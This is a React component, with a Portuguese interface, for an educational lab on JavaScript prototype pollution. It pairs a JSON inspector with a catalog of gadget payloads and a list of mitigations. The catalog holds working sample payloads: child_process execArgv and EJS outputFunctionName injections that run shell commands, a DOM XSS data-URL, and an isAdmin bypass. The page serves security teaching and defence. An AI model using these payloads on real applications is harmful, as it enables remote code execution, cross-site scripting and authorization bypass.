import React, { useState, useMemo } from 'react';
import { 
  Cpu, 
  ShieldAlert, 
  CheckCircle2, 
  AlertTriangle, 
  Copy, 
  Check, 
  Code2, 
  Layers, 
  Terminal, 
  RefreshCw,
  Zap,
  Lock
} from 'lucide-react';

interface GadgetInfo {
  name: string;
  target: 'CLIENT' | 'NODEJS_RCE' | 'DOS';
  description: string;
  pollutedKey: string;
  samplePayload: string;
}

const GADGET_CATALOG: GadgetInfo[] = [
  {
    name: 'Node.js child_process.fork (execArgv RCE)',
    target: 'NODEJS_RCE',
    description: 'Polui execArgv para injetar a flag --eval no processo filho invocado pelo Node.js.',
    pollutedKey: 'execArgv',
    samplePayload: '{"__proto__": {"execArgv": ["--eval=require(\'child_process\').execSync(\'touch /tmp/pwned\')"]}}'
  },
  {
    name: 'EJS Template Engine (outputFunctionName RCE)',
    target: 'NODEJS_RCE',
    description: 'EJS utiliza a propriedade global outputFunctionName para gerar a função de renderização sem sanitização prévia.',
    pollutedKey: 'outputFunctionName',
    samplePayload: '{"__proto__": {"outputFunctionName": "_;process.mainModule.require(\'child_process\').execSync(\'id\');"}}'
  },
  {
    name: 'DOM XSS via Script Transport / jQuery',
    target: 'CLIENT',
    description: 'Polui a propriedade src ou dataType no resolvedor de requisições assíncronas do frontend.',
    pollutedKey: 'src',
    samplePayload: '{"__proto__": {"src": "data:text/javascript,alert(document.domain)"}}'
  },
  {
    name: 'Bypass de Autorização e Flag Admin',
    target: 'CLIENT',
    description: 'Polui objetos vazios com propriedades como isAdmin ou role, fazendo checagens if (user.isAdmin) passarem.',
    pollutedKey: 'isAdmin',
    samplePayload: '{"__proto__": {"isAdmin": true, "role": "superuser"}}'
  }
];

export const PrototypePollutionStudio: React.FC = () => {
  const [jsonInput, setJsonInput] = useState<string>(
    '{\n  "__proto__": {\n    "isAdmin": true,\n    "role": "superuser"\n  }\n}'
  );
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // Safety inspection of input JSON without actually polluting global Object.prototype!
  const analysis = useMemo(() => {
    try {
      const parsed = JSON.parse(jsonInput);
      const rawText = jsonInput;
      const containsProto = rawText.includes('__proto__') || rawText.includes('constructor') || rawText.includes('prototype');

      let detectedKeys: string[] = [];
      if (parsed && typeof parsed === 'object') {
        // Look for keys
        if ('__proto__' in parsed) {
          detectedKeys = Object.keys((parsed as any)['__proto__'] || {});
        }
      }

      return {
        validJson: true,
        isDangerous: containsProto,
        detectedKeys,
        risk: containsProto ? 'ALTO / CRÍTICO' : 'SEGURO'
      };
    } catch {
      return {
        validJson: false,
        isDangerous: false,
        detectedKeys: [],
        risk: 'JSON INVÁLIDO'
      };
    }
  }, [jsonInput]);

  const handleCopy = (key: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 sm:p-6 shadow-xl relative overflow-hidden">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-5">
          <div className="space-y-1.5">
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-0.5 rounded-full bg-purple-500/15 border border-purple-500/30 text-purple-400 font-mono text-xs font-bold flex items-center gap-1.5">
                <Cpu className="w-3.5 h-3.5" />
                <span>Prototype Pollution & Gadget Chains</span>
              </span>
              <span className="text-zinc-500 text-xs">•</span>
              <span className="text-zinc-400 font-mono text-xs">JavaScript & Node.js Security</span>
            </div>
            <h2 className="text-xl sm:text-2xl font-bold tracking-tight text-white">
              Laboratório de Poluição de Protótipo e Cadeias de Gadgets
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400 max-w-3xl leading-relaxed">
              Inspecione riscos de mutação de <code className="text-purple-300 font-mono">Object.prototype</code> em operações de deep merge, clones recursivos e deserialização. Conheça gadgets para escalonamento a Client-Side XSS e Server-Side RCE em Node.js.
            </p>
          </div>
        </div>
      </div>

      {/* Interactive JSON Payload Inspector */}
      <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
        <div className="flex items-center justify-between border-b border-[#1e1e28] pb-2 text-xs font-mono">
          <span className="text-zinc-300 font-bold flex items-center gap-1.5">
            <Terminal className="w-4 h-4 text-purple-400" />
            <span>Payload JSON Sob Análise de Merge Recursivo</span>
          </span>
          <button
            type="button"
            onClick={() => handleCopy('json-input', jsonInput)}
            className="text-zinc-400 hover:text-white flex items-center gap-1"
          >
            {copiedKey === 'json-input' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
            <span>Copiar JSON</span>
          </button>
        </div>

        <textarea
          rows={6}
          value={jsonInput}
          onChange={e => setJsonInput(e.target.value)}
          className="w-full px-3.5 py-2.5 rounded-xl bg-[#0c0c10] border border-[#232330] text-purple-300 font-mono text-xs focus:outline-none focus:border-purple-500/50 resize-none leading-relaxed"
        />

        {/* Diagnosis Status */}
        <div className="bg-[#161622] p-4 rounded-xl border border-[#232333] space-y-2 text-xs font-mono">
          <div className="flex items-center justify-between">
            <span className="text-zinc-400">Classificação de Risco de Poluição:</span>
            <span className={`px-2 py-0.5 rounded font-bold ${
              analysis.isDangerous ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40' : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
            }`}>
              {analysis.risk}
            </span>
          </div>

          {analysis.isDangerous && (
            <p className="text-zinc-300 text-[11px] leading-relaxed">
              O objeto submetido tenta alterar propriedades compartilhadas de <code className="text-purple-300">Object.prototype</code>. Em funções de merge vulneráveis (ex: lodash.merge &lt; 4.17.12), todos os novos objetos instanciados herdarão as chaves: <strong>{analysis.detectedKeys.join(', ') || '__proto__'}</strong>.
            </p>
          )}
        </div>
      </div>

      {/* Gadget Catalog Grid */}
      <div className="space-y-4">
        <h3 className="text-sm font-bold text-white flex items-center gap-2 border-b border-[#22222d] pb-2">
          <Layers className="w-4 h-4 text-purple-400" />
          <span>Catálogo de Gadgets Conhecidos para Escalonamento de Impacto</span>
        </h3>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {GADGET_CATALOG.map((gadget, idx) => (
            <div key={idx} className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-md flex flex-col justify-between">
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-white">{gadget.name}</span>
                  <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded border ${
                    gadget.target === 'NODEJS_RCE' ? 'bg-rose-500/20 text-rose-300 border-rose-500/30' :
                    'bg-cyan-500/20 text-cyan-300 border-cyan-500/30'
                  }`}>
                    {gadget.target}
                  </span>
                </div>
                <p className="text-xs text-zinc-400 leading-relaxed">{gadget.description}</p>
                <div className="text-[11px] font-mono text-zinc-500">
                  Propriedade Alvo: <span className="text-purple-300 font-bold">{gadget.pollutedKey}</span>
                </div>

                <pre className="p-2.5 rounded-xl bg-[#0a0a0f] border border-[#1e1e28] text-purple-300 font-mono text-[11px] overflow-x-auto break-all">
                  {gadget.samplePayload}
                </pre>
              </div>

              <div className="pt-2 flex items-center justify-between border-t border-[#1e1e28]">
                <button
                  type="button"
                  onClick={() => setJsonInput(gadget.samplePayload)}
                  className="text-xs font-mono text-purple-400 hover:underline cursor-pointer"
                >
                  Carregar no Testador
                </button>
                <button
                  type="button"
                  onClick={() => handleCopy(`gadget-${idx}`, gadget.samplePayload)}
                  className="text-xs font-mono text-zinc-400 hover:text-white flex items-center gap-1 cursor-pointer"
                >
                  {copiedKey === `gadget-${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Defensive Remediation */}
      <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-lg">
        <h3 className="text-sm font-bold text-white flex items-center gap-2 border-b border-[#1e1e28] pb-2">
          <Lock className="w-4 h-4 text-emerald-400" />
          <span>Estratégias de Mitigação e Defesa</span>
        </h3>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs font-mono">
          <div className="bg-[#161622] p-3 rounded-xl border border-[#232333] space-y-1">
            <span className="text-emerald-400 font-bold">1. Congelamento do Protótipo</span>
            <p className="text-zinc-300 text-[11px]">
              Execute <code className="text-white">Object.freeze(Object.prototype)</code> na inicialização do servidor para impedir qualquer mutação em runtime.
            </p>
          </div>
          <div className="bg-[#161622] p-3 rounded-xl border border-[#232333] space-y-1">
            <span className="text-emerald-400 font-bold">2. Mapas Sem Protótipo</span>
            <p className="text-zinc-300 text-[11px]">
              Crie dicionários com <code className="text-white">Object.create(null)</code> ou utilize a estrutura nativa <code className="text-white">Map</code>.
            </p>
          </div>
          <div className="bg-[#161622] p-3 rounded-xl border border-[#232333] space-y-1">
            <span className="text-emerald-400 font-bold">3. Flag Node.js Protegida</span>
            <p className="text-zinc-300 text-[11px]">
              Inicie a aplicação com a flag <code className="text-white">--disable-proto=delete</code> para neutralizar acessos a __proto__.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
